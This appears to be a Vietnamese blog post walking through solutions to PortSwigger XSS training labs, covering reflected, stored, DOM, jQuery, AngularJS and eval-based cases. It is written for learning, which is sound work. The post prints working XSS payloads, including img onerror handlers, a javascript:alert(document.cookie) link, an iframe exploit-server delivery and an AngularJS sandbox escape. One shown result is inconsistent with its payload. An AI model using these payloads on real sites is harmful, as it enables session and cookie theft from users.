---
title: "[PortSwigger Lab] - Cross Site Script"
description: Solution of XSS on PortSwigger Lab
date: 2025-05-25 22:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, xss, cross site script]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-05-25-portswigger-cross-site-script/xss.png
    alt: Cross Site Script
---

## Introduction
---

### Cross-Site Scripting (XSS)
`Cross-Site Scripting (XSS)` là một lỗ hổng bảo mật phổ biến trong các ứng dụng web, cho phép kẻ tấn công chèn mã độc (thường là `JavaScript`) vào trang web được người dùng khác truy cập. Khi nạn nhân truy cập trang web bị chèn mã, đoạn mã độc sẽ được trình duyệt thực thi thay cho người dùng, từ đó kẻ tấn công có thể:
- Đánh cắp `cookie`, `session token`
- Thực hiện hành vi thay người dùng (ví dụ gửi yêu cầu giả danh người dùng)
- Hiển thị nội dung giả mạo
- Lừa người dùng nhập thông tin cá nhân

### Type of XSS
1. Stored XSS (XSS lưu trữ): 
- Mã độc được lưu vào cơ sở dữ liệu, bình luận, bài viết... và được hiển thị lại cho các người dùng khác.
- Ví dụ: người dùng chèn script vào phần bình luận → các người dùng khác vào xem sẽ bị dính mã độc.

2. Reflected XSS (XSS phản chiếu):
- Mã độc nằm trong URL hoặc input và được phản hồi ngay trong trang web.

3. DOM-based XSS:
- Mã độc được thực thi bởi chính `JavaScript` phía client do thao tác với DOM mà không kiểm tra kỹ input.

## Solve XSS Labs
---

### Lab: Reflected XSS into HTML context with nothing encoded
> Mục tiêu: Thực hiện một cuộc tấn công kịch bản chéo trang để gọi hàm `alert`.

Phòng thí nghiệm này chứa một lỗ hổng `XSS reflected` đơn giản trong chức năng tìm kiếm.

1. Lổ hổng `XSS reflected` xuất hiện ở chức năng `search`, kết quả khi `search`:
```html
0 search results for 'abc'
```

2. Thay thế `abc` bằng `payload`:
```
<img src=0 onerror=alert(1)>
```
- `<img src=0>`: cố gắng tải một ảnh từ đường dẫn "0" → sẽ bị lỗi (image không tồn tại).
- `onerror=alert(1)`: khi lỗi xảy ra (tức là không tải được ảnh), sự kiện `onerror` được kích hoạt và trình duyệt thực thi alert(1).

### Lab: Stored XSS into HTML context with nothing encoded
> Mục tiêu: Thực hiện một cuộc tấn công kịch bản chéo trang để gọi hàm `alert`.

Phòng thí nghiệm này chứa một lỗ hổng `XSS stored` đơn giản trong chức năng tìm kiếm.

1. Lổ hổng `XSS stored` xuất hiện ở chức năng `comment`, sau khi `comment`, `payload` được lưu trữ và hiển thị trên trình duyệt nạn nhân truy cập vào liên kết đó 
Payload:
```
<img src=0 onerror=alert(1)>
```

2. Thêm `payload` trên vào phần comment, điền đầy đủ thông tin và đăng
3. Trở lại bài `post` -> xuất hiện `alert`

### Lab: DOM XSS in **document.write** sink using source **location.search**
> Mục tiêu: Thực hiện một cuộc tấn công kịch bản chéo trang để gọi hàm `alert`.

Phòng thí nghiệm này chứa lỗ hổng XSS dựa trên DOM trong chức năng theo dõi truy vấn tìm kiếm. Nó sử dụng chức năng JavaScript `document.write`, ghi dữ liệu ra trang. Hàm `document.write` được gọi với dữ liệu từ `location.search`, mà bạn có thể kiểm soát bằng URL trang web.

1. Thực hiện `search`, kết quả:
```html
0 search results for 'abc'
```

2. **Inspect**, kiểm tra `<script>`
```html
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>                    
<img src="/resources/images/tracker.gif?searchTerms=abc" gafqlj9w1="">
```
- Đọc giá trị `search` từ `URL`
- Dùng `document.write(...)` để chèn ảnh vào trang với `query`  là từ khóa cần tìm

3. Thêm `payload` để tạo thêm thẻ `<img>`
```
"> <img src=0 onerror=alert(1)>
```

4. Kết quả:
```html
<img src="/resources/images/tracker.gif?searchTerms=" qm024hoew="">
<img src="0" onerror="alert(1)">
">
```

### Lab: DOM XSS in **innerHTML** sink using source **location.search**
- Mục tiêu: Thực hiện một cuộc tấn công kịch bản chéo trang để gọi hàm `alert`.
- Vị trí lỗ hổng: chức năng `search`.

#### Result after `search`:

```html
<h1>
    <span>0 search results for '</span>
    <span id="searchMessage">abc</span>
    <span>'</span>
</h1>

<script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }
</script>
```

Flow:
- Lấy từ khóa từ thanh `url`
- Ghi từ khóa vào `<span id="searchMessage">Từ khóa</span>`

#### Exploit:
- Thêm payload `<img src=0 onerror=alert(1)>`
- search

### Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
- Mục tiêu: Tạo alert `document.cookie` liên kết khi`"back"`.
- Vị trí lỗ hổng: trang `submit feedback`

#### Submit feedback
- Thanh `url` tại `feedback page`:  `https://abc.web-security-academy.net/feedback?returnPath=/`
- Script:
```html
<script>
    $(function() {
        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
</script>
```
- Thẻ a với id `#backLink` được gán thuộc tính `href` = giá trị của `returnPath` trên thanh `url`

#### Exploit
- Thanh đổi `url` thành `https://abc.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)`
- Thẻ a với id `#backLink`:
```html
<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
```
- **'javascript:'** là một `URI scheme` đặc biệt trong `HTML`, cho phép nhúng mã `JavaScript` vào thuộc tính như `href`.

### Lab: DOM XSS in jQuery selector sink using a hashchange event
- Mục tiêu: Cung cấp một khai thác cho nạn nhân gọi hàm `print()` trong trình duyệt của họ.
- Loại lỗ hổng: `DOM-based XSS`
- Vị trí: chức năng `hashchange`

#### Script 
```html
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```
Flow:
- Khi có **hashchange** `https://abc.web-security-academy.net/#<img src=1 onerror=alert(1)>`
- Ứng dụng sẽ lấy `post` có tên trùng với `hashchange` rồi `scroll view` tới vị trí của `post` đó
- `jQuery` sẽ phân tích `selector` này như `HTML`: 
```html
$('section.blog-list h2:contains(<img src=x onerror=alert(1)>)')
```
- Dẫn đến thực thi mã độc → XSS xảy ra.

#### Exploit
- Đến **Exploit server**
- Thêm vào Body:

```html
<iframe src="https://abc.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

- Để đảm bảo `'<img src=x onerror=print()>'` được thực thi, ta cần thêm nó vào sau khi `load iframe` thông qua sự kiện `onload`.
- Deliver to victim

> Nếu bạn đưa **HTML** vào trong **$('...')** mà không có dấu ngoặc kép, **jQuery** sẽ hiểu đó là một đoạn **HTML**, chứ không phải là **selector** → nó sẽ tạo **DOM** mới từ đoạn đó.
{: .prompt-info}

### Lab: Reflected XSS into attribute with angle brackets HTML-encoded
- Mục tiêu: Thực hiện một cuộc tấn công kịch bản chéo trang để gọi hàm `alert`.
- Loại lỗ hổng: Reflected XSS 
- Vị trí: chức năng `search`

#### From search
```html
<form action="/" method="GET">
    <input type="text" placeholder="Search the blog..." name="search" value="abc">
    <button type="submit" class="button">Search</button>
</form>
```
- Sau khi search `abc` thì `value`=`"abc"`
#### Exploit
- Sử dụng payload: `"onmouseover="alert(1)`
- Form sẽ được thêm `event`

```html
<form action="/" method="GET">
    <input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">
    <button type="submit" class="button">Search</button>
</form>
```
- Khi `hover` vào `input`, `alert(1)` sẽ xuất hiện

### Stored XSS into anchor href attribute with double quotes HTML-encoded
- Mục tiêu: Thực hiện một cuộc tấn công XSS để gọi hàm `alert`.
- Loại lỗ hổng: Stored XSS
- Vị trí: Chức năng `Comment` - Phần `Website`

#### Comment inspect

```html
<section class="comment">
    <p>
        <img src="/resources/images/avatarDefault.svg" class="avatar">                            
        <a id="author" href="http://a.com">a</a> | 26 May 2025
    </p>
    <p>a</p>
    <p></p>
</section>
```

#### Exploit
Payload:
```
javascript:alert(1)
```
- Thêm paylaod này vào phần `Website`
- Submit
- Thẻ `<a>` được thay đổi thành

```html
<a id="author" href="http://a.com">a</a> | 26 May 2025
```
- Khi click vào `a`, XSS xuất hiện.


### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
- Mục tiêu: Thực hiện một tấn công XSS phản xạ `(reflected XSS)` để gọi hàm `alert()` bằng cách thoát khỏi chuỗi `JavaScript` nơi dữ liệu được phản xạ, mặc dù các dấu " đã bị mã hóa.
- Loại lỗ hổng: Reflected XSS
- Vị trí: Chức năng `search`

#### Search inspect
```html
<script>
    var searchTerms = 'abc';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
<img src="/resources/images/tracker.gif?searchTerms=abc" c54oj1cyc="">
```

#### Exploit
- Search với payload
```
; alert(1);//
```
- Source code sẽ thay đổi thành
```html
<script>
    var searchTerms = ''; alert(1);//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
<img src="/resources/images/tracker.gif?searchTerms=" cv1nsp83o="">
```
- Tách lệnh bằng `;` sau đó hiện thị `alert(1)` và `comment` bằng `//`

```html
<script>
    var searchTerms = ''; alert(1);//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
<img src="/resources/images/tracker.gif?searchTerms=" cv1nsp83o="">
```

- Dùng cách ngắn hơn `'-alert(1)-'` hay `'+alert(1)+'`

### Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element
- Mục tiêu: Thực hiện một tấn công XSS để gọi hàm `alert()`
- Loại lỗ hổng: DOM base XSS
- Vị trí: Chức năng `stock checker`

#### Code inspect
```html
<form id="stockCheckForm" action="/product/stock" method="POST">
    <input required="" type="hidden" name="productId" value="1">
    <script>
        var stores = ["London","Paris","Milan"];
        var store = (new URLSearchParams(window.location.search)).get('storeId');
        document.write('<select name="storeId">');
        if(store) {
            document.write('<option selected>'+store+'</option>');
        }
        for(var i=0;i<stores.length;i++) {
            if(stores[i] === store) {
                continue;
            }
            document.write('<option>'+stores[i]+'</option>');
        }
        document.write('</select>');
    </script>
    <select name="storeId">
        <option>London</option>
        <option>Paris</option>
        <option>Milan</option>
    </select>
    <button type="submit" class="button">Check stock</button>
</form>
```

Có thể khai thác từ đây
```html
<script>
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected>'+store+'</option>');
    }
</script>
```

- Ứng dụng lấy `storeId` từ `url`
- Ghi `storeId` ra `page` nếu có

#### Exploit
- Mặc định chưa có tham số `storeId` trên url
- Cần thêm `storeId` dưới dạng `payload`
```
https://0a8e00370342ad4c80f112380058001f.web-security-academy.net/product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
```

- Request
```http
GET /product?productId=1&storeId=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E HTTP/1.1
Host: 0a8e00370342ad4c80f112380058001f.web-security-academy.net
```

- Script trở thành

```html
<form id="stockCheckForm" action="/product/stock" method="POST">
    ...
    <select name="storeId">
        <option selected="">"&gt;</option>
    </select>
    <img src="1" onerror="alert(1)">
    <option>London</option>
    <option>Paris</option>
    <option>Milan</option>
    <button type="submit" class="button">Check stock</button>
</form>
```

### Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
- Mục tiêu: Tấn công XSS thực thi biểu thức `AngularJS` và gọi hàm `alert()`
- Lỗ hổng: DOM base XSS trong một biểu thức `AngularJS`
- Vị trí: Trong chức năng tìm kiếm

```html
<h1>0 search results for '123'</h1>
```

- Xem nguồn trang và quan sát rằng chuỗi ngẫu nhiên của bạn được đặt trong một chỉ thị `ng-app`
{% raw %}
- Nhập biểu thức AngularJS sau trong hộp tìm kiếm: `{{$on.constructor('alert(1)')()}}`
- `{{ ... }}` là `AngularJS expression binding`.
{% endraw %}
- `$on` là một phương thức mặc định trong scope của một `controller/component` trong `AngularJS` — nó dùng để đăng ký event listeners.
- `$on.constructor` → trả về Function constructor, vì $on là một function.
- `'alert(1)'` → được truyền vào Function constructor → tạo ra function thực thi alert(1).
- `()` gọi function đó → thực thi XSS (alert(1)).

### Lab: Reflected DOM XSS
- Mục tiêu: Tạo một `inject` gọi hàm `alert()`

### Response from server

#### /resources/js/searchResults.js
```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Cache-Control: public, max-age=3600
X-Frame-Options: SAMEORIGIN
Content-Length: 2728

function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();
    ...
}
```
- Trong `response` trên có hàm nguy hiển `eval()`
- `eval()` nguy hiểm vì nó cho phép thực thi bất kỳ mã JavaScript nào được truyền vào dưới dạng chuỗi, ví dụ:

```js
eval("alert('Hacked!')");
```

#### Response for /search-results?search=\"-alert(1)}//
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 45

{"results":[],"searchTerm":"\\"-alert(1)}//"}
```
- `this.responseText` lúc này là chuỗi `'{"results":[],"searchTerm":"\\"-alert(1)}//"}'`
- khi `eval()` chạy chuỗi JSON này, nó dịch chuỗi escape \" thành ", và sẽ hiểu đoạn mã là:

```js
var searchResultsObj = {
  results: [],
  searchTerm: ""-alert(1)}//"
};
```

---
Goodluck! 🍀🍀🍀
